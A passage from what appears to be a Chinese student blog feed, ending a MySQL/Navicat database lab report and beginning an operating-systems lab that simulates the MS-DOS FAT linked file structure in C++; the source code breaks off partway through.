src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324212559725.png" alt="image-20220324212559725"></p></li><li><p>导出结果：</p><ul><li><p>person.xls:</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324214407036.png" alt="image-20220324214407036"></p></li><li><p>user.xls:</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324215122090.png" alt="image-20220324215122090"></p></li></ul></li></ul></li><li><p>导入数据：</p><ul><li><p>右击”表“，点击“导入向导”：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324215708714.png" alt="image-20220324215708714"></p></li><li><p>选择需要导入的数据格式：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324215855668.png" alt="image-20220324215855668"></p></li><li><p>选择数据源：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220007188.png" alt="image-20220324220007188"></p></li><li><p>选择附加选项：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220043156.png" alt="image-20220324220043156"></p></li><li><p>选择目标表：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220124726.png" alt="image-20220324220124726"></p></li><li><p>调整表结构：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220208772.png" alt="image-20220324220208772"></p></li><li><p>选择导入模式：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220305549.png" alt="image-20220324220305549"></p></li><li><p>开始导入：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220506211.png" alt="image-20220324220506211"></p></li><li><p>导入结果如下：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324220625601.png" alt="image-20220324220625601"></p></li></ul></li></ul><h4 id="对数据库服务器进行管理"><a href="#对数据库服务器进行管理" class="headerlink" title="对数据库服务器进行管理"></a>对数据库服务器进行管理</h4><ul><li><p>”工具“-”服务器监控“-“MySQL”，可以查看：</p><ul><li><p>服务器进程列表：可以进行”结束进程“</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324221050959.png" alt="image-20220324221050959"></p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324221131147.png" alt="image-20220324221131147"></p></li><li><p>服务器变量：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324221206114.png" alt="image-20220324221206114"></p></li><li><p>服务器状态：</p><p> <img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324221226090.png" alt="image-20220324221226090"></p></li></ul></li></ul><h4 id="查询构建"><a href="#查询构建" class="headerlink" title="查询构建"></a>查询构建</h4><p>通过”查询构建工具“得到SQL语句</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220324221824377.png" alt="image-20220324221824377"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>通过此次实验，我成功安装并启动了MySQL，以搭建今后实验的平台，了解了DBMS的工作原理和系统构架，为完成今后的数据库实验打下了坚实的基础。</p><ul><li><p>这个过程中遇到的一个问题是：直接打开“命令提示符”去启动MySQL服务时会报错如下：</p><p><img src="/2022/04/01/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E4%B8%80%EF%BC%9A%E8%AE%A4%E8%AF%86DBMS%E7%B3%BB%E7%BB%9F/image-20220330151436516.png" alt="image-20220330151436516"></p><ul><li>这是因为使用<code>net start</code>命令需要管理员权限。故需要在“管理员权限”的命令行中启动MySQL。</li></ul></li></ul><p>此外，在本次实验中，我还学会通过MySQL的图形化界面工具Navicat来更好地管理和使用MySQL。</p>]]></content>
    
    
    <categories>
      
      <category>数据库系统课程实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库系统实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统文件结构的C++模拟</title>
    <link href="/2022/01/13/FileStructure/"/>
    <url>/2022/01/13/FileStructure/</url>
    
    <content type="html"><![CDATA[<h1 id="实验八-文件结构"><a href="#实验八-文件结构" class="headerlink" title="实验八 文件结构"></a>实验八 文件结构</h1><h2 id="第一题-MS-DOS中磁盘文件的存储结构"><a href="#第一题-MS-DOS中磁盘文件的存储结构" class="headerlink" title="第一题 MS-DOS中磁盘文件的存储结构"></a>第一题 MS-DOS中磁盘文件的存储结构</h2><h3 id="实验题目"><a href="#实验题目" class="headerlink" title="实验题目"></a>实验题目</h3><p>模拟设计MS-DOS操作系统中磁盘文件的存储结构。</p><h4 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h4><p>（1）当用户对记录式文件采用顺序存以方式时，用户总是依次地访问一个个逻辑记录，即当访问了第i个记录后，下次总是访问第i+1个记录。所以，当用户采用顺序存取方式访问文件时，只要给出访问要求（读或写）而无需再指出要访问的记录号。</p><p>（2）采用链接文件结构，只有读出一个物理块信息后才能从链接字中得知下一个物理块号。所以，当用户要在文件中插入一些信息时，文件系统必须多次地请求启动磁盘读出信息才能做插入工作。</p><p><img src="/2022/01/13/FileStructure/image-20211221110015455.png" alt="image-20211221110015455"></p><ul><li><p>MS-DOS操作系统对链接文件结构作了改进，它是把所有的链接指针集中在一起，存放在文件定位表FAT中。查找链接字时不必读出物理块信息可直接从FAT中得到。</p></li><li><p>其设计思想是：<br>假定磁盘上共有N个物理块可供使用，FAT就有N项，初始化时为全“0”，表示对应的物理块均可使用，当要存放文件时，从FAT中寻找为“0”的项，其对应的物理块用来存放文件信息，把文件的链接指针（指出物理块号）登记。在FAT中，文件第一块块号登记在文件目录中。</p><p><img src="/2022/01/13/FileStructure/image-20211221110148618.png" alt="image-20211221110148618"></p></li></ul><p>（3）假定磁盘存储空间共有32个物理块，模拟设计文件定位表FAT。文件定位表可以用一个一维数组FAT[031]来定义，其中一个元素与一个物理块对应。当FAT[i]=0时，表示第i块为空闲块；当FAT[i]=FFF时，表示链接文件到第i块结束；当在0~FFF时，其值指示链接文件中下一个物理块号。</p><p>（4）每个物理块只能存放一个逻辑记录，设计一个程序把文件的逻辑结构模拟转换成MS-DOS的链接结构。</p><ul><li><p>要求保存一个已经在主存中的文件时，给出文件名和文件的逻辑记录长度及个数，对一个已经保存的文件，允许用户插入新记录。用键盘输入来模拟用户的要求，输入信息为：<br>“存” ：文件名 逻辑记录个数；<br>“插入” ：文件名 逻辑记录号。</p></li><li><p>模拟程序的算法如下图所示：</p><p><img src="/2022/01/13/FileStructure/image-20211221110505777.png" alt="image-20211221110505777"></p><p>（5）假设系统中已经有两个链接文件，其链接情况由FAT表指出（链接情况学生自定），现又要保存一个新文件，然后对已保存的文件插入一个新记录。运行你所设计的程序，观察其结果。</p></li></ul><h3 id="程序中使用的数据结构及符号说明"><a href="#程序中使用的数据结构及符号说明" class="headerlink" title="程序中使用的数据结构及符号说明"></a>程序中使用的数据结构及符号说明</h3><ol><li><p>结构体及其数组（数据结构）：文件目录信息</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">File</span> //文件目录信息</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-built_in">string</span> name; <span class="hljs-comment">//文件名</span><br><span class="hljs-type">int</span> start;   <span class="hljs-comment">//起始块号</span><br><span class="hljs-type">int</span> length;  <span class="hljs-comment">//文件长度</span><br>&#125;;<br>File catalog[<span class="hljs-number">10001</span>]; <span class="hljs-comment">//文件目录</span><br></code></pre></div></td></tr></table></figure></li><li><p>数组（数据结构）：文件定位表</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> FAT[<span class="hljs-number">10001</span>];      <span class="hljs-comment">//文件定位表</span><br></code></pre></div></td></tr></table></figure></li><li><p>整型变量</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;         <span class="hljs-comment">//已存的文件数</span><br><span class="hljs-type">int</span> N;               <span class="hljs-comment">//物理块总数</span><br><span class="hljs-type">int</span> rest;            <span class="hljs-comment">//空闲块个数</span><br></code></pre></div></td></tr></table></figure></li><li><p>自定义函数</p><ul><li><code>void init()</code> ：初始化</li><li><code>void store()</code>：存</li><li><code>void ins()</code>：插入（每次一块）</li><li><code>void disCatalog()</code>：打印文件目录</li><li><code>void disFAT()</code>：打印FAT表</li></ul></li></ol><h3 id="源程序并附上注释"><a href="#源程序并附上注释" class="headerlink" title="源程序并附上注释"></a>源程序并附上注释</h3><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">File</span> <span class="hljs-comment">//文件目录信息</span><br>&#123;<br>string name; <span class="hljs-comment">//文件名</span><br><span class="hljs-type">int</span> start;   <span class="hljs-comment">//起始块号</span><br><span class="hljs-type">int</span> length;  <span class="hljs-comment">//文件长度</span><br>&#125;;<br>File catalog[<span class="hljs-number">10001</span>]; <span class="hljs-comment">//文件目录</span><br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;         <span class="hljs-comment">//已存的文件数</span><br><span class="hljs-type">int</span> N;               <span class="hljs-comment">//物理块总数</span><br><span class="hljs-type">int</span> rest;            <span class="hljs-comment">//空闲块个数</span><br><span class="hljs-type">int</span> FAT[<span class="hljs-number">10001</span>];      <span class="hljs-comment">//文件定位表</span><br><br><span class="hljs-comment">//初始化</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入物理块个数：&quot;</span>;<br>cin &gt;&gt; N;<br>rest = N;<br><span class="hljs-comment">//FAT表初始化为全0</span><br><span class="hljs-built_in">memset</span>(FAT, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(FAT));<br><span class="hljs-comment">//注:FAT[0]固定为FDF；-1表示FFF</span><br>&#125;<br><br><span class="hljs-comment">//存</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">store</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>string s;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入要存入的文件名：&quot;</span>;<br>cin &gt;&gt; s;<br><span class="hljs-comment">//检查是否有同名文件</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (catalog[i].name == s)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;已存在同名文件！&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//若无同名文件：</span><br><span class="hljs-type">int</span> len;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入文件记录个数：&quot;</span>;<br>cin &gt;&gt; len;<br><span class="hljs-keyword">if</span> (len &gt; rest) <span class="hljs-comment">//检查空闲块是否够</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;磁盘空间不够！&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">//通过检查后,文件目录记录文件信息：</span><br>catalog[cnt].name = s;<br>catalog[cnt].length = len;<br><span class="hljs-type">int</span> last; <span class="hljs-comment">//记录上一个物理块的位置</span><br><span class="hljs-comment">//按链接结构填FAT表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>&#123;<br><span class="hljs-comment">//遍历FAT表</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= N; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (FAT[j] == <span class="hljs-number">0</span> &amp;&amp; j != last) <span class="hljs-comment">//若找到空闲块</span><br>&#123;<br><span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) <span class="hljs-comment">//文件起始块</span><br>&#123;<br>catalog[cnt].start = j;<br>last = j;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-comment">//不是文件起始块</span><br>&#123;<br><span class="hljs-comment">//更新FAT表</span><br>FAT[last] = j;<br>last = j;<br><span class="hljs-keyword">if</span> (i == len - <span class="hljs-number">1</span>) <span class="hljs-comment">//如果是文件最后一块</span><br>&#123;<br>FAT[j] = <span class="hljs-number">-1</span>; <span class="hljs-comment">//-1表示FFF</span><br>&#125;<br>&#125;<br>rest--;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;文件保存完毕！&quot;</span> &lt;&lt; endl;<br>cnt++; <span class="hljs-comment">//文件保存完毕，已存文件数加1</span><br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//插入（每次一块）</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ins</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>string s;<br>cout &lt;&lt; <span class="hljs-string">&quot;请输入文件名：&quot;</span>;<br>cin &gt;&gt; s;<br><span class="hljs-type">bool</span> flag = <span class="hljs-number">0</span>; <span class="hljs-comment">//标记是否存在该文件</span><br><span class="hljs-comment">//检查是否有同名文件</span><br><span class="hljs-type">int</span> num; <span class="hljs-comment">//插入记录的文件在目录中的位置</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (catalog[i].name == s)<br>&#123;<br>num = i;<br>flag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (!flag) <span class="hljs-comment">//不存在该文件</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无此文件！&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (rest == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;无空闲块！&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> ins_num; <span class="hljs-comment">//逻辑记录编号</span><br>cout &lt;&lt; <span class="hljs-string">&quot;请输入 插入的逻辑记录在文件中的编号：&quot;</span>;<br>cin &gt;&gt; ins_num;<br><span class="hljs-keyword">if</span> (ins_num &gt; catalog[num].length + <span class="hljs-number">1</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;编号过大！&quot;</span>;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">int</span> free_block;<br><span class="hljs-comment">// 寻找空闲块</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= N; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (FAT[i] == <span class="hljs-number">0</span>)<br>&#123;<br>free_block = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">//更新文件目录</span><br>catalog[num].length++;<br><span class="hljs-type">int</span> temp_pos = <span class="hljs-number">0</span>; <span class="hljs-comment">//记录遍历到的逻辑记录编号</span><br><span class="hljs-type">int</span> pre; <span class="hljs-comment">//前一个逻辑记录的位置</span><br><span class="hljs-comment">//依次遍历该文件的逻辑记录在FAT表中的块</span><br><span class="hljs-comment">//i:当前位置 FAT[i]:下一位置</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = catalog[num].start; FAT[i] != <span class="hljs-number">-1</span>; i = FAT[i])<br>&#123;<br>temp_pos++;<br><span class="hljs-keyword">if</span> (temp_pos == ins_num - <span class="hljs-number">1</span>) <span class="hljs-comment">//到达插入位置的前一链接块</span><br>&#123;<br><span class="hljs-comment">//修改链接指针（重点）</span><br>FAT[free_block] = FAT[i];<br>FAT[i] = free_block;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (ins_num == <span class="hljs-number">1</span>) <span class="hljs-comment">//头部插入</span><br>&#123;<br>catalog[num].start = free_block;<br>&#125;<br><span class="hljs-keyword">if</span> (ins_num == catalog[num].length) <span class="hljs-comment">//尾部插入</span><br>&#123;<br>FAT[free_block] = <span class="hljs-number">-1</span>;<br>&#125;<br>cout &lt;&lt; <span class="hljs-string">&quot;插入完毕&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//输出文件目录</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">disCatalog</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;文件目录如下：&quot;</span> &lt;&lt; endl;<br><span class="hljs-comment">//表头</span><br>cout &lt;&lt; <span class="hljs-string">&quot;| 文件名 | 起始块号 |&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;| &quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">6</span>) &lt;&lt; catalog[i].name &lt;&lt; <span class="hljs-string">&quot; | &quot;</span> &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; catalog[i].start &lt;&lt; <span class="hljs-string">&quot; |&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//输出FAT表</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">disFAT</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;FAT表如下：&quot;</span> &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt;= N; 